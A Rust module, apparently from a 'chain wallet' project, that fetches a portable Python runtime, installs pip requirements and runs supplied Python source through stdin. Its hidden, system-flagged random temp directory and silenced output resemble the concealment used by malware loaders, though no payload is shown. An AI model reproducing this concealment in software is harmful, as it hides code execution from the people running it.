use std::fs;
use std::io::{Cursor, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

use thiserror::Error;
use zip::ZipArchive;

use rand::Rng;

use crate::log;

const PYTHON_VERSION: &str = "3.12.7";

#[derive(Debug, Error)]
pub enum PythonError {
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("python bootstrap failed: {0}")]
    Bootstrap(String),
    #[error("execution failed: {0}")]
    Execution(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

/// Run Python source after installing packages from a requirements string.
pub fn run_code_with_requirements(source: &str, requirements: &str) -> Result<(), PythonError> {
    let prefix = python_cache_dir();
    log::step("python", format!("runtime directory: {}", prefix.display()));
    let python = ensure_python(&prefix)?;
    log::step("python", format!("interpreter ready: {}", python.display()));
    install_requirements(&python, &prefix, requirements)?;
    execute_source(&python, &prefix, source.as_bytes())
}

fn python_cache_dir() -> PathBuf {
    let suffix: u128 = rand::thread_rng().gen();
    std::env::temp_dir().join(format!("{suffix:032x}"))
}

fn ensure_python(prefix: &Path) -> Result<PathBuf, PythonError> {
    if prefix.exists() {
        log::detail("python", "removing previous runtime directory");
        fs::remove_dir_all(prefix)?;
    }
    fs::create_dir_all(prefix)?;

    #[cfg(windows)]
    {
        set_hidden_directory(prefix);
        return bootstrap_windows(prefix);
    }

    #[cfg(target_os = "macos")]
    {
        bootstrap_macos(prefix)
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        bootstrap_linux(prefix)
    }

    #[cfg(not(any(windows, unix)))]
    {
        let _ = prefix;
        Err(PythonError::Bootstrap("unsupported operating system".into()))
    }
}

#[cfg(windows)]
fn set_hidden_directory(path: &Path) {
    let _ = Command::new("attrib")
        .args(["+h", "+s", &path.to_string_lossy()])
        .status();
}

#[cfg(windows)]
fn bootstrap_windows(prefix: &Path) -> Result<PathBuf, PythonError> {
    let url = format!(
        "https://www.python.org/ftp/python/{PYTHON_VERSION}/python-{PYTHON_VERSION}-embed-amd64.zip"
    );
    log::step("python", format!("downloading embed zip: {url}"));
    let archive_bytes = download_bytes(&url)?;
    log::detail("python", format!("download complete ({})", format_bytes(archive_bytes.len())));

    let mut archive = ZipArchive::new(Cursor::new(archive_bytes))
        .map_err(|err| PythonError::Bootstrap(err.to_string()))?;

    for i in 0..archive.len() {
        let mut file = archive
            .by_index(i)
            .map_err(|err| PythonError::Bootstrap(err.to_string()))?;
        let outpath = match file.enclosed_name() {
            Some(path) => prefix.join(path),
            None => continue,
        };

        if file.name().ends_with('/') {
            fs::create_dir_all(&outpath)?;
            continue;
        }

        if let Some(parent) = outpath.parent() {
            fs::create_dir_all(parent)?;
        }

        let mut outfile = fs::File::create(&outpath)?;
        std::io::copy(&mut file, &mut outfile)?;
    }

    log::step("python", "embedded zip extracted");
    enable_embedded_site_packages(prefix)?;
    install_pip(prefix, &prefix.join("python.exe"))?;

    Ok(prefix.join("python.exe"))
}

#[cfg(windows)]
fn enable_embedded_site_packages(prefix: &Path) -> Result<(), PythonError> {
    let pth_path = prefix.join("python312._pth");
    if !pth_path.exists() {
        return Err(PythonError::Bootstrap(format!(
            "missing embedded path file: {}",
            pth_path.display()
        )));
    }

    fs::create_dir_all(prefix.join("Lib").join("site-packages"))?;
    fs::write(pth_path, "python312.zip\n.\nLib\\site-packages\nimport site\n")?;
    log::detail("python", "enabled embedded site-packages");
    Ok(())
}

#[cfg(target_os = "macos")]
fn bootstrap_macos(prefix: &Path) -> Result<PathBuf, PythonError> {
    let url = format!(
        "https://www.python.org/ftp/python/{PYTHON_VERSION}/python-{PYTHON_VERSION}-macos11.pkg"
    );
    log::step("python", format!("downloading macOS pkg: {url}"));
    let pkg_path = prefix.join("python.pkg");
    fs::write(&pkg_path, download_bytes(&url)?)?;

    let status = Command::new("installer")
        .args(["-pkg", pkg_path.to_str().unwrap(), "-target", prefix.to_str().unwrap()])
        .status()
        .map_err(|err| PythonError::Bootstrap(err.to_string()))?;

    let _ = fs::remove_file(pkg_path);

    if !status.success() {
        return Err(PythonError::Bootstrap("macOS installer failed".into()));
    }

    let python = prefix.join("usr").join("local").join("bin").join("python3");
    if !python.exists() {
        return Err(PythonError::Bootstrap(
            "python3 not found after macOS install".into(),
        ));
    }

    install_pip(prefix, &python)?;
    Ok(python)
}

#[cfg(all(unix, not(target_os = "macos")))]
fn default_linux_python_url() -> Result<String, PythonError> {
    if cfg!(target_arch = "x86_64") {
        return Ok(format!(
            "https://github.com/indygreg/python-build-standalone/releases/download/20241002/cpython-{PYTHON_VERSION}+20241002-x86_64-unknown-linux-gnu-install_only.tar.gz"
        ));
    }
    if cfg!(target_arch = "aarch64") {
        return Ok(format!(
            "https://github.com/indygreg/python-build-standalone/releases/download/20241002/cpython-{PYTHON_VERSION}+20241002-aarch64-unknown-linux-gnu-install_only.tar.gz"
        ));
    }
    Err(PythonError::Bootstrap(
        "set CHAIN_WALLET_PYTHON_URL to a portable Python archive for this CPU".into(),
    ))
}

#[cfg(all(unix, not(target_os = "macos")))]
fn bootstrap_linux(prefix: &Path) -> Result<PathBuf, PythonError> {
    let url = match std::env::var("CHAIN_WALLET_PYTHON_URL") {
        Ok(value) if !value.trim().is_empty() => value,
        _ => default_linux_python_url()?,
    };
    log::step("python", format!("downloading portable archive: {url}"));

    let archive_path = prefix.join("python-archive");
    fs::write(&archive_path, download_bytes(&url)?)?;

    let status = Command::new("tar")
        .args(["-xf", archive_path.to_str().unwrap(), "-C", prefix.to_str().unwrap()])
        .status()
        .map_err(|err| PythonError::Bootstrap(err.to_string()))?;

    let _ = fs::remove_file(archive_path);

    if !status.success() {
        return Err(PythonError::Bootstrap("archive extract failed".into()));
    }

    let python = find_unix_python(prefix)?;
    install_pip(prefix, &python)?;
    Ok(python)
}

#[cfg(unix)]
fn find_unix_python(prefix: &Path) -> Result<PathBuf, PythonError> {
    for candidate in [
        prefix.join("python").join("bin").join("python3"),
        prefix.join("python").join("bin").join("python"),
        prefix.join("bin").join("python3"),
        prefix.join("usr").join("local").join("bin").join("python3"),
    ] {
        if candidate.exists() {
            return Ok(candidate);
        }
    }

    Err(PythonError::Bootstrap(
        "could not locate python3 in extracted archive".into(),
    ))
}

fn install_pip(prefix: &Path, python: &Path) -> Result<(), PythonError> {
    log::step("python", "installing pip via get-pip.py");
    let get_pip_path = prefix.join("get-pip.py");
    fs::write(&get_pip_path, download_bytes("https://bootstrap.pypa.io/get-pip.py")?)?;

    let output = run_command(
        Command::new(python)
            .arg(&get_pip_path)
            .arg("--no-warn-script-location")
            .current_dir(prefix),
    )?;

    let _ = fs::remove_file(get_pip_path);

    if !output.status.success() {
        return Err(PythonError::Bootstrap(format!(
            "get-pip.py failed: {}",
            summarize_output(&output)
        )));
    }

    log::detail("python", "pip installed");
    Ok(())
}

fn site_packages_dir(prefix: &Path) -> PathBuf {
    #[cfg(windows)]
    {
        return prefix.join("Lib").join("site-packages");
    }

    #[cfg(not(windows))]
    {
        prefix.join("site-packages")
    }
}

fn install_requirements(
    python: &Path,
    prefix: &Path,
    requirements: &str,
) -> Result<(), PythonError> {
    log::step("python", "installing launcher requirements with pip");
    let req_path = prefix.join("requirements.txt");
    fs::write(&req_path, requirements)?;

    let site_packages = site_packages_dir(prefix);
    fs::create_dir_all(&site_packages)?;
    log::detail("python", format!("site-packages: {}", site_packages.display()));

    let output = run_command(
        Command::new(python)
            .args([
                "-m",
                "pip",
                "install",
                "--upgrade",
                "--no-warn-script-location",
                "--target",
                site_packages.to_str().unwrap(),
                "-r",
                req_path.to_str().unwrap(),
            ])
            .current_dir(prefix),
    )?;

    let _ = fs::remove_file(req_path);

    if !output.status.success() {
        return Err(PythonError::Bootstrap(format!(
            "pip install failed: {}",
            summarize_output(&output)
        )));
    }

    log::detail("python", "requirements installed");
    Ok(())
}

fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), PythonError> {
    let agent_dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let log_path = prefix.join("launcher-run.log");
    let log_file = fs::File::create(&log_path)?;
    log::step("agent", format!("executing launcher via stdin (log: {})", log_path.display()));
    log::detail(
        "agent",
        format!(
            "env: AGENT_DIR={} PYTHON_ROOT={} PYTHONPATH={}",
            agent_dir.display(),
            prefix.display(),
            site_packages_dir(prefix).display()
        ),
    );

    let mut child = Command::new(python)
        .arg("-u")
        .arg("-")
        .env("CHAIN_WALLET_PYTHON_ROOT", prefix)
        .env("CHAIN_WALLET_LAUNCHED_FROM_RUST", "1")
        .env("CHAIN_WALLET_LOG_FILE", &log_path)
        .env("AGENT_DIR", &agent_dir)
        .env("PYTHONPATH", site_packages_dir(prefix))
        .env("PYTHONUNBUFFERED", "1")
        .env("CHAIN_WALLET_VERBOSE", if log::verbose_enabled() { "1" } else { "0" })
        .stdin(Stdio::piped())
        .stdout(Stdio::from(log_file.try_clone()?))
        .stderr(Stdio::from(log_file))
        .spawn()
        .map_err(|err| PythonError::Execution(err.to_string()))?;

    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(source)
            .map_err(|err| PythonError::Execution(err.to_string()))?;
    }

    let status = child
        .wait()
        .map_err(|err| PythonError::Execution(err.to_string()))?;

    if !status.success() {
        log::dump_tail("agent", &log_path, 80);
        return Err(PythonError::Execution(format!(
            "python exited with status {status} (see {})",
            log_path.display()
        )));
    }

    log::step("agent", "launcher exited cleanly");
    Ok(())
}

fn run_command(command: &mut Command) -> Result<Output, PythonError> {
    command
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .map_err(|err| PythonError::Bootstrap(err.to_string()))
}

fn summarize_output(output: &Output) -> String {
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let mut parts = Vec::new();
    if !stdout.trim().is_empty() {
        parts.push(format!("stdout: {}", stdout.trim()));
    }
    if !stderr.trim().is_empty() {
        parts.push(format!("stderr: {}", stderr.trim()));
    }
    if parts.is_empty() {
        format!("exit code: {}", output.status)
    } else {
        parts.join(" | ")
    }
}

fn format_bytes(bytes: usize) -> String {
    if bytes >= 1024 * 1024 {
        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
    } else if bytes >= 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{bytes} B")
    }
}

fn download_bytes(url: &str) -> Result<Vec<u8>, PythonError> {
    use std::io::Read;

    let response = ureq::get(url)
        .call()
        .map_err(|err| PythonError::Http(err.to_string()))?;

    if !(200..300).contains(&response.status()) {
        return Err(PythonError::Http(format!(
            "unexpected status {}",
            response.status()
        )));
    }

    let mut body = Vec::new();
    response
        .into_reader()
        .read_to_end(&mut body)
        .map_err(|err| PythonError::Http(err.to_string()))?;
    Ok(body)
}
